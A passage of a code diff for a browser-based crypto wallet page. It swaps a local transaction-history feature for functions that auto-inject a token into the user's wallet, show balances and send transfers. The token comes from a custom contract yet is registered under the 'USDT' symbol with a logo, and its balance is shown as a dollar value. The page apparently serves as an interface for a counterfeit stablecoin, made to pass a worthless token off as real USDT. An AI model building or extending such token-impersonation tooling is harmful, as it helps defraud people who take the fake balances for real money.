                     params: { type: 'ERC20', options: { address: CONTRACT_ADDRESS, symbol: 'USDT', decimals: 18, image: LOGO_URL } }
                 });
-            } catch (err) { showToast("Wallet Security Policy Blocked Injection"); }
-        }
-
-        // --- Dual-Ledger Execution ---
-        async function executeTransfer() {
-            const to = document.getElementById('txTo').value;
-            const amt = document.getElementById('txAmt').value;
-            const btnText = document.getElementById('btnText');
-            const spinner = document.getElementById('btnSpinner');
-
-            if(!to || !amt) return showToast("Fill recipient & amount");
-
-            try {
-                btnText.innerText = "Signing..."; spinner.style.display = "block";
-                const dec = await contract.decimals();
-                const tx = await contract.transfer(to, ethers.utils.parseUnits(amt, dec));
-                
-                btnText.innerText = "Processing Block...";
-                await tx.wait();
-                
-                showToast("Transfer Complete!");
-                saveTransactionToHistory(to, amt); // In-App Ledger Caching
-                closeSendModal(); 
-                fetchBalances();
-            } catch (e) { 
-                showToast("Transaction Failed"); 
-            } finally { 
-                btnText.innerText = "Confirm Transaction"; spinner.style.display = "none"; 
+                showNotification("Asset Successfully Registered");
+            } catch (err) {
+                console.log("Wallet bypassed auto-inject or user rejected.");
             }
         }
-
-        // --- In-App Local Caching System ---
-        function saveTransactionToHistory(to, amount) {
-            let history = JSON.parse(localStorage.getItem('txHistory')) || [];
-            const newTx = {
-                to: to.substring(0,6) + "..." + to.substring(38),
-                amount: amount,
-                date: new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', hour: '2-digit', minute:'2-digit' })
-            };
-            history.unshift(newTx); // Add to top
-            localStorage.setItem('txHistory', JSON.stringify(history));
-            if(document.getElementById('history').classList.contains('active')) loadHistory();
+        
+        // Manual trigger fallback (If user clicks the USDT row)
+        function injectTokenManual() {
+            if(userAccount) autoInjectToken();
         }
 
-        function loadHistory() {
-            const history = JSON.parse(localStorage.getItem('txHistory')) || [];
-            const container = document.getElementById('historyContainer');
-            
-            if(history.length === 0) return;
-            
-            document.getElementById('emptyHistory').style.display = 'none';
-            container.innerHTML = '';
-            
-            history.forEach(tx => {
-                container.innerHTML += `
-                <div class="history-row">
-                    <div class="w-10 h-10 rounded-full bg-[var(--danger)] bg-opacity-10 flex items-center justify-center mr-4">
-                        <svg class="w-5 h-5 text-[var(--danger)]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7h12m0 0l-4-4m4 4l-4 4m0 6H4m0 0l4 4m-4-4l4-4"></path></svg>
-                    </div>
-                    <div class="flex-1">
-                        <h4 class="font-bold text-[15px] leading-tight">Transfer</h4>
-                        <p class="text-[12px] text-[var(--text-muted)] font-medium mt-0.5">To: ${tx.to} • ${tx.date}</p>
-                    </div>
-                    <div class="text-right">
-                        <h4 class="font-bold text-[15px] tabular-nums text-[var(--danger)] leading-tight">- ${parseFloat(tx.amount).toFixed(2)}</h4>
-                        <p class="text-[12px] text-[var(--text-muted)] font-medium tabular-nums mt-0.5">USDT</p>
-                    </div>
-                </div>`;
-            });
+        // --- Real-Time Fetching Logic ---
+        async function fetchLiveBalances() {
+            if(!userAccount) return;
+            try {
+                // Get BNB
+                const bnb = await provider.getBalance(userAccount);
+                document.getElementById('rowBnbBal').innerText = parseFloat(ethers.utils.formatEther(bnb)).toFixed(4);
+
+                // Get Custom USDT
+                const bal = await contract.balanceOf(userAccount);
+                const dec = await contract.decimals();
+                const numVal = parseFloat(ethers.utils.formatUnits(bal, dec));
+                
+                // Format nicely (e.g. 99,989,994.73)
+                const displayStr = numVal.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+                
+                // Update UI Instantly
+                document.getElementById('mainVal').innerText = displayStr;
+                document.getElementById('rowUsdtBal').innerText = displayStr;
+                document.getElementById('rowUsdtVal').innerText = "$" + displayStr;
+            } catch (e) { console.error("Sync Error", e); }
+        }
+
+        // --- Flawless Execution (Send) ---
+        async function executeTx() {
+            const to = document.getElementById('txTo').value;
+            const amt = document.getElementById('txAmt').value;
+            const btn = document.getElementById('execBtn');
+
+            if(!to || !amt) return showNotification("Enter valid details");
+
+            try {
+                btn.innerText = "Signing..."; btn.classList.add('opacity-50');
+                const dec = await contract.decimals();
+                const parsedAmt = ethers.utils.parseUnits(amt, dec);
+                
+                const tx = await contract.transfer(to, parsedAmt);
+                
+                btn.innerText = "Processing on Chain...";
+                await tx.wait(); // Wait for actual blockchain confirmation
+                
+                showNotification("Transfer Successful!");
+                closeSend();
+                fetchLiveBalances(); // Update instantly
+            } catch (e) { 
+                showNotification("Transfer Failed"); 
+            } finally { 
+                btn.innerText = "Preview Transfer"; btn.classList.remove('opacity-50');
+            }
         }
     </script>
 </body>
